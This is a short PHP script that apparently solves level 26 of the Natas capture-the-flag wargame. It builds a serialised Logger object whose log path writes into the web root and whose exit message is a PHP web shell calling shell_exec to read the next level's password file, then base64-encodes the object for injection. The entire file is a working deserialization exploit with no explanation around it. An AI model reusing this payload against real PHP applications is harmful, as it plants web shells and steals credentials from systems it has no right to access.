<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $sessionID="lknb7cqfotn22jqqgp9qii1q4q";
        
        $this->logFile = "/var/www/natas/natas26/img/natas26_".$sessionID.".php";
        $this->exitMsg= "<?php echo '\n'.shell_exec('cat /etc/natas_webpass/natas27'); ?>";
    }
}

$object = new Logger();
$serialized = serialize($object);
echo $serialized;
echo "\n\n";
echo base64_encode($serialized);
?>